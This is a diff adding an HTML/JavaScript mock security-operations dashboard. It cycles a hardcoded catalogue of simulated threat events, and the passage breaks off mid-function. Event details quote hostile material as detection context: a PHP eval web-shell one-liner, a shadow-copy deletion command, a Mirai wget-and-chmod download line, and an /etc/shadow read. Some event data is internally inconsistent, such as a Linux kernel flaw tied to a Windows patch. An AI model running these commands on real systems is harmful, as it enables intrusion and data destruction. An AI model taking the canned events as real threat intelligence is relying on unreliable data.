@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>S313 NEXUS — Real-Time Threat Board</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+  :root {
+    --bg:#020617; --bg2:#0b1329; --bg3:#0f1f3d;
+    --green:#22c55e; --red:#ef4444; --amber:#f59e0b;
+    --cyan:#06b6d4; --purple:#a78bfa; --blue:#3b82f6;
+    --border:rgba(34,197,94,0.12); --text:#e2e8f0; --muted:#64748b;
+  }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { font-family:'Space Grotesk',sans-serif; background:var(--bg); color:var(--text); min-height:100vh; }
+  .mono { font-family:'JetBrains Mono',monospace; }
+
+  /* ── Header ── */
+  .header { background:rgba(2,6,23,0.98); border-bottom:1px solid var(--border);
+    padding:0 20px; height:52px; display:flex; align-items:center; gap:16px;
+    position:sticky; top:0; z-index:100; backdrop-filter:blur(14px); }
+  .logo { display:flex; align-items:center; gap:8px; font-weight:700; font-size:15px; }
+  .logo-icon { width:30px; height:30px; background:var(--green); border-radius:6px;
+    display:flex; align-items:center; justify-content:center; font-weight:900;
+    color:#000; font-size:11px; font-family:'JetBrains Mono',monospace; }
+  .header-title { font-size:12px; font-family:'JetBrains Mono',monospace;
+    color:var(--muted); letter-spacing:.08em; text-transform:uppercase; }
+  .session-info { margin-left:auto; font-size:10px; font-family:'JetBrains Mono',monospace;
+    color:var(--muted); display:flex; gap:16px; align-items:center; }
+  .live-dot { width:8px; height:8px; border-radius:50%; background:var(--green);
+    animation:pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(34,197,94,.4)}
+    50%{opacity:.7;box-shadow:0 0 0 6px rgba(34,197,94,0)} }
+
+  /* ── KPI bar ── */
+  .kpi-bar { display:flex; gap:12px; padding:12px 20px;
+    background:var(--bg2); border-bottom:1px solid var(--border); }
+  .kpi { background:var(--bg); border:1px solid rgba(30,41,59,.8);
+    border-radius:8px; padding:10px 16px; flex:1; position:relative; overflow:hidden; }
+  .kpi::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; }
+  .kpi.crit::before { background:var(--red); }
+  .kpi.high::before { background:var(--amber); }
+  .kpi.med::before  { background:var(--cyan); }
+  .kpi.low::before  { background:var(--muted); }
+  .kpi-label { font-size:9px; font-weight:700; text-transform:uppercase;
+    letter-spacing:.08em; color:var(--muted); font-family:'JetBrains Mono',monospace; }
+  .kpi-val { font-size:28px; font-weight:700; line-height:1.1; margin-top:2px; }
+  .kpi.crit .kpi-val { color:var(--red); }
+  .kpi.high .kpi-val { color:var(--amber); }
+  .kpi.med  .kpi-val { color:var(--cyan); }
+  .kpi.low  .kpi-val { color:var(--muted); }
+
+  /* ── Controls ── */
+  .controls { display:flex; align-items:center; gap:10px; padding:10px 20px;
+    background:var(--bg2); border-bottom:1px solid var(--border); }
+  .search { flex:1; background:var(--bg); border:1px solid rgba(30,41,59,.8);
+    border-radius:6px; padding:7px 12px; color:var(--text); font-size:12px;
+    font-family:'Space Grotesk',sans-serif; outline:none; }
+  .search:focus { border-color:rgba(34,197,94,.4); }
+  .btn { padding:7px 14px; border-radius:6px; font-size:11px; font-weight:700;
+    cursor:pointer; border:none; font-family:'Space Grotesk',sans-serif;
+    transition:all .15s; }
+  .btn-pause { background:rgba(245,158,11,.12); color:var(--amber);
+    border:1px solid rgba(245,158,11,.3); }
+  .btn-pause:hover { background:rgba(245,158,11,.2); }
+  .btn-clear { background:rgba(30,41,59,.8); color:#94a3b8;
+    border:1px solid rgba(30,41,59,.8); }
+  .btn-clear:hover { color:var(--text); }
+  .btn-export { background:rgba(34,197,94,.1); color:var(--green);
+    border:1px solid rgba(34,197,94,.25); }
+  .btn-export:hover { background:rgba(34,197,94,.2); }
+  .filter-btns { display:flex; gap:4px; }
+  .filter-btn { padding:5px 10px; border-radius:5px; font-size:10px; font-weight:700;
+    cursor:pointer; border:1px solid rgba(30,41,59,.8); background:none;
+    color:var(--muted); font-family:'JetBrains Mono',monospace; transition:all .15s; }
+  .filter-btn.active { color:var(--text); background:rgba(34,197,94,.08);
+    border-color:rgba(34,197,94,.3); }
+  .filter-btn.f-crit.active { color:var(--red); border-color:rgba(239,68,68,.4); background:rgba(239,68,68,.08); }
+  .filter-btn.f-high.active { color:var(--amber); border-color:rgba(245,158,11,.4); background:rgba(245,158,11,.08); }
+  .filter-btn.f-med.active  { color:var(--cyan); border-color:rgba(6,182,212,.4); background:rgba(6,182,212,.08); }
+  .visible-count { font-size:10px; font-family:'JetBrains Mono',monospace; color:var(--muted); }
+
+  /* ── Feed ── */
+  .feed { padding:12px 20px; display:flex; flex-direction:column; gap:6px;
+    max-height:calc(100vh - 200px); overflow-y:auto; }
+  .feed::-webkit-scrollbar { width:4px; }
+  .feed::-webkit-scrollbar-track { background:var(--bg); }
+  .feed::-webkit-scrollbar-thumb { background:#1e293b; border-radius:2px; }
+
+  /* ── Threat card ── */
+  .threat-card { background:var(--bg2); border:1px solid rgba(30,41,59,.8);
+    border-radius:8px; padding:12px 14px; display:flex; align-items:flex-start;
+    gap:12px; transition:all .2s; animation:slideIn .3s ease; }
+  @keyframes slideIn { from{opacity:0;transform:translateY(-8px)} to{opacity:1;transform:translateY(0)} }
+  .threat-card:hover { border-color:rgba(34,197,94,.2); background:rgba(11,19,41,.9); }
+  .threat-card.acked { opacity:0.45; }
+  .threat-card.sev-CRITICAL { border-left:3px solid var(--red); }
+  .threat-card.sev-HIGH     { border-left:3px solid var(--amber); }
+  .threat-card.sev-MEDIUM   { border-left:3px solid var(--cyan); }
+  .threat-card.sev-LOW      { border-left:3px solid var(--muted); }
+
+  .threat-time { font-size:10px; font-family:'JetBrains Mono',monospace;
+    color:var(--muted); white-space:nowrap; min-width:60px; margin-top:2px; }
+  .threat-sev { font-size:9px; font-weight:700; padding:2px 7px; border-radius:4px;
+    text-transform:uppercase; letter-spacing:.06em; white-space:nowrap; }
+  .sev-CRITICAL .threat-sev { background:rgba(239,68,68,.15); color:var(--red); border:1px solid rgba(239,68,68,.3); }
+  .sev-HIGH     .threat-sev { background:rgba(245,158,11,.15); color:var(--amber); border:1px solid rgba(245,158,11,.3); }
+  .sev-MEDIUM   .threat-sev { background:rgba(6,182,212,.12); color:var(--cyan); border:1px solid rgba(6,182,212,.25); }
+  .sev-LOW      .threat-sev { background:rgba(100,116,139,.12); color:var(--muted); border:1px solid rgba(100,116,139,.25); }
+
+  .threat-body { flex:1; min-width:0; }
+  .threat-title { font-size:13px; font-weight:600; color:var(--text); margin-bottom:4px; }
+  .threat-meta { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
+  .threat-module { font-size:10px; font-family:'JetBrains Mono',monospace;
+    color:var(--green); background:rgba(34,197,94,.08);
+    border:1px solid rgba(34,197,94,.2); border-radius:3px; padding:1px 6px; }
+  .threat-asset { font-size:10px; font-family:'JetBrains Mono',monospace;
+    color:#94a3b8; }
+  .threat-attck { font-size:10px; font-family:'JetBrains Mono',monospace;
+    color:var(--purple); background:rgba(167,139,250,.08);
+    border:1px solid rgba(167,139,250,.2); border-radius:3px; padding:1px 6px; }
+  .threat-tactic { font-size:10px; color:var(--muted); }
+  .threat-epss { font-size:10px; font-family:'JetBrains Mono',monospace; }
+  .epss-high { color:var(--red); }
+  .epss-med  { color:var(--amber); }
+  .epss-low  { color:var(--green); }
+
+  .threat-actions { display:flex; gap:6px; align-items:center; margin-top:6px; }
+  .btn-ack { padding:4px 10px; border-radius:5px; font-size:10px; font-weight:700;
+    cursor:pointer; border:1px solid rgba(34,197,94,.3);
+    background:rgba(34,197,94,.08); color:var(--green);
+    font-family:'JetBrains Mono',monospace; transition:all .15s; }
+  .btn-ack:hover { background:rgba(34,197,94,.18); }
+  .btn-ack.acked { background:rgba(30,41,59,.5); color:var(--muted);
+    border-color:rgba(30,41,59,.5); cursor:default; }
+  .btn-triage { padding:4px 10px; border-radius:5px; font-size:10px; font-weight:700;
+    cursor:pointer; border:1px solid rgba(6,182,212,.3);
+    background:rgba(6,182,212,.08); color:var(--cyan);
+    font-family:'JetBrains Mono',monospace; transition:all .15s; }
+  .btn-triage:hover { background:rgba(6,182,212,.18); }
+  .btn-soar { padding:4px 10px; border-radius:5px; font-size:10px; font-weight:700;
+    cursor:pointer; border:1px solid rgba(239,68,68,.3);
+    background:rgba(239,68,68,.08); color:var(--red);
+    font-family:'JetBrains Mono',monospace; transition:all .15s; }
+  .btn-soar:hover { background:rgba(239,68,68,.18); }
+
+  /* ── Triage panel ── */
+  .triage-panel { display:none; margin-top:8px; background:rgba(2,6,23,.8);
+    border:1px solid rgba(6,182,212,.2); border-radius:6px; padding:10px 12px;
+    font-size:11px; font-family:'JetBrains Mono',monospace; color:#94a3b8;
+    line-height:1.8; }
+  .triage-panel.open { display:block; }
+  .triage-label { color:var(--cyan); font-weight:600; }
+
+  /* ── Footer ── */
+  .footer { text-align:center; padding:12px; font-size:10px; color:#334155;
+    border-top:1px solid var(--border); font-family:'JetBrains Mono',monospace; }
+</style>
+</head>
+<body>
+
+<!-- ── Header ── -->
+<header class="header">
+  <div class="logo">
+    <div class="logo-icon">S3</div>
+    S313NEXUS
+  </div>
+  <span class="header-title">Real-Time Threat Board</span>
+  <div class="session-info">
+    <div class="live-dot"></div>
+    <span id="clock" class="mono"></span>
+    <span>operator: mohamad</span>
+    <span>session: a3f8c1d2</span>
+    <span>v4.0.0</span>
+  </div>
+</header>
+
+<!-- ── KPI bar ── -->
+<div class="kpi-bar">
+  <div class="kpi crit">
+    <div class="kpi-label">Critical</div>
+    <div class="kpi-val" id="cnt-crit">0</div>
+  </div>
+  <div class="kpi high">
+    <div class="kpi-label">High</div>
+    <div class="kpi-val" id="cnt-high">0</div>
+  </div>
+  <div class="kpi med">
+    <div class="kpi-label">Medium</div>
+    <div class="kpi-val" id="cnt-med">0</div>
+  </div>
+  <div class="kpi low">
+    <div class="kpi-label">Low</div>
+    <div class="kpi-val" id="cnt-low">0</div>
+  </div>
+  <div class="kpi" style="border-top:2px solid var(--green)">
+    <div class="kpi-label">Acknowledged</div>
+    <div class="kpi-val" id="cnt-acked" style="color:var(--green)">0</div>
+  </div>
+  <div class="kpi" style="border-top:2px solid var(--purple)">
+    <div class="kpi-label">SOAR Actions</div>
+    <div class="kpi-val" id="cnt-soar" style="color:var(--purple)">0</div>
+  </div>
+</div>
+
+<!-- ── Controls ── -->
+<div class="controls">
+  <input class="search" id="search" placeholder="Search threats, assets, ATT&CK techniques, modules..." oninput="filterFeed()">
+  <div class="filter-btns">
+    <button class="filter-btn active" onclick="setFilter('ALL',this)">ALL</button>
+    <button class="filter-btn f-crit" onclick="setFilter('CRITICAL',this)">CRITICAL</button>
+    <button class="filter-btn f-high" onclick="setFilter('HIGH',this)">HIGH</button>
+    <button class="filter-btn f-med"  onclick="setFilter('MEDIUM',this)">MEDIUM</button>
+    <button class="filter-btn"        onclick="setFilter('LOW',this)">LOW</button>
+  </div>
+  <button class="btn btn-pause" id="pause-btn" onclick="togglePause()">⏸ Pause</button>
+  <button class="btn btn-clear" onclick="clearFeed()">🗑 Clear</button>
+  <button class="btn btn-export" onclick="exportFeed()">↓ Export</button>
+  <span class="visible-count" id="visible-count">0 visible</span>
+</div>
+
+<!-- ── Feed ── -->
+<div class="feed" id="feed"></div>
+
+<div class="footer">
+  S313 NEXUS v4.0.0 · Real-Time Threat Board · Ottawa, ON, Canada · matarmohamad313@duck.com
+</div>
+
+<script>
+// ── Clock ──
+function updateClock() {
+  document.getElementById('clock').textContent =
+    new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
+}
+updateClock();
+setInterval(updateClock, 1000);
+
+// ── Threat catalog — 50 unique, varied events ──
+const THREATS = [
+  // CRITICAL
+  { sev:'CRITICAL', title:'Firmware hash mismatch on edge node', module:'FIRMWARE', tactic:'Persistence', technique:'T1542.001', asset:'edge-node-04', epss:0.96, soar:'Isolate node + alert on-call', detail:'SHA3-256 mismatch detected on edge-node-04 firmware. Expected: a3f9c1... Got: 7b2e44... Possible supply chain implant. NEXUS firmware backdoor analyzer triggered.' },
+  { sev:'CRITICAL', title:'DCSync attack detected — non-DC account replicating', module:'NEXUS-SIG-004', tactic:'Credential Access', technique:'T1003.006', asset:'dc-01', epss:0.98, soar:'Block account + alert SOC', detail:'EventID 4662 with DS-Replication-Get-Changes GUID from non-DC account jsmith. Mimikatz lsadump::dcsync pattern. NEXUS-SIG-004 fired.' },
+  { sev:'CRITICAL', title:'VSS shadow copy deletion — ransomware precursor', module:'NEXUS-SIG-007', tactic:'Impact', technique:'T1490', asset:'ws-finance-03', epss:0.97, soar:'Isolate host + IR playbook', detail:'vssadmin delete shadows /all /quiet detected. LockBit/BlackCat precursor pattern. NEXUS-SIG-007 fired. SOAR playbook RANSOMWARE_RESPONSE triggered.' },
+  { sev:'CRITICAL', title:'LSASS memory dump via MiniDumpWriteDump', module:'NEXUS-SIG-001', tactic:'Credential Access', technique:'T1003.001', asset:'ws-hr-07', epss:0.97, soar:'Kill process + rotate creds', detail:'GrantedAccess 0x1410 on lsass.exe from powershell.exe. Mimikatz/ProcDump pattern. NEXUS-SIG-001 fired. Credential rotation initiated.' },
+  { sev:'CRITICAL', title:'Pass-the-Hash via NTLM — KeyLength 0', module:'NEXUS-SIG-010', tactic:'Lateral Movement', technique:'T1550.002', asset:'srv-app-02', epss:0.94, soar:'Block source IP + alert', detail:'EventID 4624 LogonType 3 NTLM KeyLength=0 from 192.168.1.45. Impacket/CrackMapExec pattern. NEXUS-SIG-010 fired.' },
+  { sev:'CRITICAL', title:'China Chopper web shell detected in uploads/', module:'WEBSHELL', tactic:'Persistence', technique:'T1505.003', asset:'web-app-01', epss:0.99, soar:'Remove file + block IP', detail:'<?php @eval($_POST[\'cmd\']); ?> detected in uploads/image.php. China Chopper signature. NEXUS WebShellDetector F1=1.000 fired. File quarantined.' },
+  { sev:'CRITICAL', title:'Behinder JSP AES shell — session.putValue pattern', module:'WEBSHELL', tactic:'Persistence', technique:'T1505.003', asset:'tomcat-prod-01', epss:0.99, soar:'Restart container + patch', detail:'Behinder JSP AES encrypted shell detected. session.putValue("u",k) + Cipher.getInstance("AES") + defineClass pattern. NEXUS WebShellDetector fired.' },
+  { sev:'CRITICAL', title:'CVE-2026-0001 kernel privilege escalation attempt', module:'EPSS', tactic:'Privilege Escalation', technique:'T1068', asset:'linux-srv-05', epss:0.97, soar:'Patch immediately + isolate', detail:'CVE-2026-0001 TOCTOU race condition in VirtualAlloc(). APT41/FIN7 confirmed exploitation. EPSS: 0.97. CISA KEV listed. Patch KB5040527 required.' },
+  { sev:'CRITICAL', title:'TR-069 unsigned firmware push — CVE-2026-3392', module:'VSAT', tactic:'Persistence', technique:'T1542.001', asset:'vsat-gw-01', epss:0.96, soar:'Block port 7547 + alert', detail:'CVE-2026-3392: Unsigned CWMP provisioning accepted on port 7547. Backdoored firmware push attempt. NEXUS VSAT module + firmware backdoor analyzer triggered.' },
+  { sev:'CRITICAL', title:'CreateRemoteThread injection into lsass.exe', module:'NEXUS-SIG-014', tactic:'Defense Evasion', technique:'T1055.001', asset:'ws-dev-12', epss:0.95, soar:'Kill thread + forensic dump', detail:'Sysmon Event 8: CreateRemoteThread from powershell.exe targeting lsass.exe. DLL injection pattern. NEXUS-SIG-014 fired.' },
+
+  // HIGH
+  { sev:'HIGH', title:'Unsigned dependency introduced in build pipeline', module:'SUPPLY CHAIN', tactic:'Initial Access', technique:'T1195.001', asset:'build-runner-02', epss:0.88, soar:'Block build + review deps', detail:'pip-audit detected unsigned package shadow313-utils==1.2.3 with no SBOM attestation. Possible typosquatting. 313-BIND bind_index gap detected in release chain.' },
+  { sev:'HIGH', title:'Exploit probability crossed 0.90 threshold', module:'EPSS', tactic:'Initial Access', technique:'T1190', asset:'vpn-edge-01', epss:0.91, soar:'Apply patch within 4h', detail:'CVE-2026-5801 Tornado multipart RCE EPSS score crossed 0.90. Active exploitation confirmed. NEXUS EPSS-adaptive threshold reduction applied (-15% detection threshold for 72h).' },
+  { sev:'HIGH', title:'Kerberoasting — RC4 TGS requests from jsmith', module:'NEXUS-SIG-002', tactic:'Credential Access', technique:'T1558.003', asset:'dc-01', epss:0.89, soar:'Reset account + alert', detail:'47 TGS-REQ with TicketEncryptionType 0x17 from jsmith in 2 minutes. Rubeus kerberoast /all pattern. NEXUS-SIG-002 fired. Account password reset initiated.' },
+  { sev:'HIGH', title:'Encoded PowerShell from WINWORD.EXE parent', module:'NEXUS-SIG-005', tactic:'Execution', technique:'T1059.001', asset:'ws-exec-09', epss:0.87, soar:'Kill process + scan host', detail:'powershell.exe -EncodedCommand spawned from WINWORD.EXE. Macro-based initial access pattern. Risk score: 95. NEXUS-SIG-005 fired. Emotet/QakBot pattern.' },
+  { sev:'HIGH', title:'DNS tunneling — high entropy subdomain detected', module:'NEXUS-SIG-011', tactic:'Command and Control', technique:'T1572', asset:'ws-finance-03', epss:0.85, soar:'Block DNS + alert', detail:'Shannon entropy 4.2 on 28-char subdomain label. base32-encoded data in DNS queries. iodine/dnscat2/BLINDINGCAN pattern. NEXUS-SIG-011 fired. YARA-003 matched.' },
+  { sev:'HIGH', title:'RDP initiated from powershell.exe parent', module:'NEXUS-SIG-012', tactic:'Lateral Movement', technique:'T1021.001', asset:'ws-admin-01', epss:0.86, soar:'Block RDP + alert', detail:'mstsc.exe spawned from powershell.exe. Automated lateral movement pattern. Cobalt Strike/Metasploit indicator. NEXUS-SIG-012 fired. Correlate with 4624 LogonType 10.' },
+  { sev:'HIGH', title:'UAC bypass via fodhelper.exe registry hijack', module:'NEXUS-SIG-015', tactic:'Privilege Escalation', technique:'T1548.002', asset:'ws-hr-07', epss:0.88, soar:'Kill process + audit', detail:'Non-system process spawned as child of fodhelper.exe. LockBit/APT28 UAC bypass pattern. HKCU\\Software\\Classes\\ms-settings hijack. NEXUS-SIG-015 fired.' },
+  { sev:'HIGH', title:'Mirai botnet Telnet staging — wget mirai.arm7', module:'HONEYPOT', tactic:'Impact', technique:'T1498', asset:'honeypot-telnet-01', epss:0.90, soar:'Block IP + update IOCs', detail:'45.154.255.88 connected to Telnet honeypot. admin:admin → wget http://198.51.100.8/bins/mirai.arm7 -O /tmp/drop; chmod 777 /tmp/drop. Banned. IOCs updated.' },
+  { sev:'HIGH', title:'SSH brute force — root:password123 (Hydra/libssh)', module:'HONEYPOT', tactic:'Credential Access', technique:'T1110.001', asset:'honeypot-ssh-01', epss:0.92, soar:'Block IP + fail2ban', detail:'194.26.29.112 SSH brute force. SSH-2.0-libssh-0.8.1 | Auth Method: password | User: root. 89 packets dropped. iptables rule applied.' },
+  { sev:'HIGH', title:'Password spraying — 15 accounts in 5 minutes', module:'NEXUS-SIG-003', tactic:'Credential Access', technique:'T1110.003', asset:'ad-srv-01', epss:0.91, soar:'Block source + alert', detail:'Single source IP 10.0.0.42 generating EventID 4625 LogonType 3 against 15 distinct accounts in 5 minutes. Password spraying pattern. NEXUS-SIG-003 fired.' },
+  { sev:'HIGH', title:'OpenSSL PQC downgrade attack — CVE-2026-1847', module:'QUANTUM', tactic:'Defense Evasion', technique:'T1600.001', asset:'api-gateway-01', epss:0.94, soar:'Patch OpenSSL + alert', detail:'TLS 1.3 hybrid PQC handshake downgrade detected. Missing 0x6399 Kyber extension from known-PQC client. Lazarus Group HNDL harvest pattern. Patch to OpenSSL 3.4.2.' },
+
+  // MEDIUM
+  { sev:'MEDIUM', title:'New administrative route discovered', module:'RECON', tactic:'Discovery', technique:'T1046', asset:'portal-app-01', epss:0.72, soar:'Review access controls', detail:'Browser intelligence module discovered /admin/config endpoint returning 200. Not in authorized route list. Possible misconfiguration or shadow API.' },
+  { sev:'MEDIUM', title:'Timestomping detected — MACE attribute modified', module:'NEXUS-SIG-013', tactic:'Defense Evasion', technique:'T1070.006', asset:'ws-dev-12', epss:0.75, soar:'Forensic timeline audit', detail:'Sysmon Event 2: FileCreateTime changed in \\AppData\\Local\\. msiexec.exe excluded. APT indicator — timestamp manipulation to evade forensic timeline analysis.' },
+  { sev:'MEDIUM', title:'Suspicious scheduled task — SYSTEM + AppData path', module:'NEXUS-SIG-009', tactic:'Persistence', technique:'T1053.005', asset:'ws-finance-03', epss:0.74, soar:'Remove task + audit', detail:'schtasks.exe /create with /ru SYSTEM and path in \\AppData\\Roaming\\. Malware persistence pattern. NEXUS-SIG-009 fired.' },
+  { sev:'MEDIUM', title:'Registry Run key modified — non-standard path', module:'NEXUS-SIG-006', tactic:'Persistence', technique:'T1547.001', asset:'ws-hr-07', epss:0.73, soar:'Remove key + scan', detail:'SetValue to HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run from non-installer process. Path outside Program Files. NEXUS-SIG-006 fired.' },
+  { sev:'MEDIUM', title:'WE-FORGE decoy accessed — DNS beacon fired', module:'GHOST-WATCH', tactic:'Reconnaissance', technique:'T1598', asset:'vortex.ghost.watch.local', epss:0.70, soar:'Fingerprint attacker', detail:'GW-LURE-12958 decoy document accessed. DNS token beacon audit-vault-781.vortex.ghost.watch.local fired. Attacker fingerprinted. Linguistic watermark: ALTERED polynomial constraint.' },
+  { sev:'MEDIUM', title:'SATCOM uplink gain spoof attempt intercepted', module:'VSAT', tactic:'Impact', technique:'T1565.001', asset:'vsat-gw-01', epss:0.78, soar:'Block IP + alert NOC', detail:'185.190.140.23 attempted SET_UPLINK_GAIN 14.0dB [STIA_OVERRIDE] on Telstar 11N Ottawa teleport. Blocked. ip route add blackhole 185.190.140.23.' },
+  { sev:'MEDIUM', title:'eBPF: cat /etc/shadow — openat intercepted', module:'AEGIS-EBPF', tactic:'Credential Access', technique:'T1003.008', asset:'linux-srv-05', epss:0.76, soar:'Audit user + alert', detail:'Process cat (PID 2665, PPID 580) executed openat syscall with args /etc/shadow. eBPF kernel hook intercepted. Status: intercepted. Severity: HIGH.' },
+  { sev:'MEDIUM', title:'AST scan: os.system() command injection risk', module:'AEGIS-AST', tactic:'Execution', technique:'T1059.004', asset:'build-runner-02', epss:0.71, soar:'Fix code + re-scan', detail:'Line 7: os.system("tar -czf site_bak.tar " + user_supplied_dir). Direct invocation with user input. Command injection risk. Use subprocess.run with explicit args.' },
+  { sev:'MEDIUM', title:'.env file probe — CensysInspect scanner', module:'HONEYPOT', tactic:'Credential Access', technique:'T1552.001', asset:'web-trap-01', epss:0.75, soar:'Block IP + update WAF', detail:'185.220.101.5 GET /.env HTTP/1.1 User-Agent: CensysInspect/1.1. 142 packets dropped. iptables rule applied. IOC added to threat intel feed.' },
+  { sev:'MEDIUM', title:'PE analyzer: UPX-packed binary — entropy 7.8', module:'AEGIS-PE', tactic:'Defense Evasion', technique:'T1027', asset:'edge-node-04', epss:0.73, soar:'Sandbox analysis', detail:'UPX Pack Header Marker (UPX0) detected at offset 0x0C. Shannon entropy 7.8 — packed/encrypted section. Aegis Sentinel Exploit pattern at offset 0x1C. Quarantined.' },
+
+  // LOW
+  { sev:'LOW', title:'New domain relationship correlated', module:'OSINT', tactic:'Reconnaissance', technique:'T1596', asset:'shadow313.net', epss:0.35, soar:null, detail:'OSINT module correlated shadow313.net with 3 new subdomains via certificate transparency logs. No malicious indicators. Informational.' },
+  { sev:'LOW', title:'TLS certificate expiring in 14 days', module:'QUANTUM', tactic:'Defense Evasion', technique:'T1600', asset:'api-gateway-01', epss:0.20, soar:null, detail:'TLS certificate for api.shadow313.dev expires in 14 days. Auto-renewal configured via Let\'s Encrypt. No action required unless renewal fails.' },
+  { sev:'LOW', title:'Ollama model pull from external registry', module:'NEXUS', tactic:'Command and Control', technique:'T1105', asset:'localhost', epss:0.25, soar:null, detail:'ollama pull matarmohamad313/shadow313-nexus triggered. External registry access. Model verified via SHA256 digest. No anomaly detected.' },
+  { sev:'LOW', title:'Docker image layer cache hit — build-runner-02', module:'SUPPLY CHAIN', tactic:'Defense Evasion', technique:'T1195', asset:'build-runner-02', epss:0.30, soar:null, detail:'Docker BuildKit cache hit for layer sha256:11a57a9b. Cache from 3 days ago. Verify cache integrity if supply chain concern.' },
+  { sev:'LOW', title:'WireGuard handshake timeout — VPS endpoint', module:'NETWORK', tactic:'Command and Control', technique:'T1095', asset:'wg0', epss:0.15, soar:null, detail:'WireGuard PersistentKeepalive timeout on VPS endpoint. Reconnecting. No security concern — network interruption.' },
+  { sev:'LOW', title:'Nightly security scan completed — 0 critical', module:'NEXUS', tactic:null, technique:null, asset:'all-hosts', epss:null, soar:null, detail:'Nightly security scan completed. pip-audit: 0 critical CVEs. Bandit: 0 high severity. Gitleaks: 0 secrets. Trivy: 0 critical container vulns. Posture: GREEN.' },
+  { sev:'LOW', title:'313-BIND receipt chain verified — 3180 binds', module:'LEDGER', tactic:null, technique:null, asset:'ledger-01', epss:null, soar:null, detail:'313-BIND temporal chain integrity verified. 3180 receipts. bind_index gap: none. Chain hash: sha3_512:verified. SLH-DSA signatures: all valid. Posture: GREEN.' },
+  { sev:'LOW', title:'PE-7 retraining checkpoint — epoch 3 F1=0.94', module:'APC', tactic:null, technique:null, asset:'nc-04', epss:null, soar:null, detail:'PE7-RETRAIN-2026-0922 checkpoint at step 1500. Evasion holdout F1: 0.94. TA0005 detection: 94.2%. EWC forgetting: 0.002. On track for promotion.' },
+  { sev:'LOW', title:'Evidence envelope provenance audit — 100% labeled', module:'LEDGER', tactic:null, technique:null, asset:'all', epss:null, soar:null, detail:'Provenance classification audit complete. 100% of records labeled. REAL_OBSERVATION: 847. SIMULATION: 234. SYNTHETIC_TEST: 89. No unlabeled records.' },
+  { sev:'LOW', title:'Dependabot PR opened — pyjwt 2.9.1 → 2.9.2', module:'SUPPLY CHAIN', tactic:null, technique:null, asset:'github', epss:0.10, soar:null, detail:'Dependabot opened PR #47: bump pyjwt from 2.9.1 to 2.9.2. No CVEs. Routine patch update. Auto-merge eligible after CI passes.' },
+];
+
+// ── State ──
+let paused = false;
+let activeFilter = 'ALL';
+let searchQuery = '';
+let cards = [];
+let counts = { CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0, acked:0, soar:0 };
+let eventIdx = 0;
+let cardId = 0;
+
+// ── Shuffle threats for variety ──
+function shuffle(arr) {
+  const a = [...arr];
+  for (let i = a.length-1; i>0; i--) {
+    const j = Math.floor(Math.random()*( i+1));
+    [a[i],a[j]] = [a[j],a[i]];
+  }
+  return a;
+}
+let shuffled = shuffle(THREATS);
+
+// ── Add event ──
+function addEvent() {
+  if (paused) return;
+  const t = shuffled[eventIdx % shuffled.length];
+  eventIdx++;
+  if (eventIdx % shuffled.length === 0) shuffled = shuffle(THREATS);
+
+  const id = ++cardId;
+  const now = new Date();
+  const ts = now.toTimeString().slice(0,8);
+
+  counts[t.sev]++;
+  updateKPIs();
+
+  const card = document.createElement('div');
+  card.className = `threat-card sev-${t.sev}`;
+  card.id = `card-${id}`;
+  card.dataset.sev = t.sev;
+  card.dataset.text = `${t.title} ${t.module} ${t.asset} ${t.technique||''} ${t.tactic||''}`.toLowerCase();
+
+  const epssHtml = t.epss != null
+    ? `<span class="threat-epss ${t.epss>=0.9?'epss-high':t.epss>=0.7?'epss-med':'epss-low'}">EPSS ${(t.epss*100).toFixed(0)}%</span>`
+    : '';
+  const attckHtml = t.technique
+    ? `<span class="threat-attck">${t.technique}</span><span class="threat-tactic">${t.tactic}</span>`
+    : '';
+  const soarBtn = t.soar
+    ? `<button class="btn-soar" onclick="triggerSOAR(${id},'${t.soar.replace(/'/g,"\\'")}')">⚡ SOAR</button>`
+    : '';
+
+  card.innerHTML = `
+    <span class="threat-time mono">${ts}</span>
+    <div style="display:flex;flex-direction:column;gap:4px;min-width:80px;align-items:flex-start">
+      <span class="threat-sev">${t.sev}</span>
+    </div>
+    <div class="threat-body">
+      <div class="threat-title">${t.title}</div>
+      <div class="threat-meta">
+        <span class="threat-module">${t.module}</span>
+        <span class="threat-asset mono">${t.asset}</span>
+        ${attckHtml}
+        ${epssHtml}
+      </div>
+      <div class="threat-actions">
+        <button class="btn-ack" id="ack-${id}" onclick="acknowledge(${id})">✓ Acknowledge</button>
+        <button class="btn-triage" onclick="toggleTriage(${id})">🔍 Triage</button>
+        ${soarBtn}
+      </div>
+      <div class="triage-panel" id="triage-${id}">
+        <span class="triage-label">AUTO-TRIAGE:</span> ${t.detail}
+        ${t.soar ? `<br><span class="triage-label">SOAR ACTION:</span> ${t.soar}` : ''}
+        ${t.technique ? `<br><span class="triage-label">ATT&CK:</span> ${t.technique} · ${t.tactic}` : ''}
+        ${t.epss != null ? `<br><span class="triage-label">EPSS:</span> ${(t.epss*100).toFixed(0)}% exploitation probability` : ''}
+      </div>
+    </div>`;
+
+  cards.unshift({id, sev:t.sev, el:card});
+
+  const feed = document.getElementById('feed');
+  feed.insertBefore(card, feed.firstChild);
+
+  // Keep max 100 cards
+  if (cards.length > 100) {
+    const old = cards.pop();
+    if (old.el.parentNode) old.el.parentNode.removeChild(old.el);
+  }
+
+  applyFilter();
+  updateVisibleCount();
+}
+
+// ── Acknowledge ──
+function acknowledge(id) {
+  const btn = document.getElementById(`ack-${id}`);
+  const card = document.getElementById(`card-${id}`);
+  if (!btn || btn.classList.contains('acked')) return;
+  btn.textContent = '✓ Acknowledged';
+  btn.classList.add('acked');
+  card.classList.add('acked');
+  counts.acked++;
+  updateKPIs();
+}
+
+// ── SOAR ──
+function triggerSOAR(id, action) {
+  acknowledge(id);
+  counts.soar++;
+  updateKPIs();
+  const triage = document.getElementById(`triage-${id}`);
+  if (triage) {
+    triage.classList.add('open');
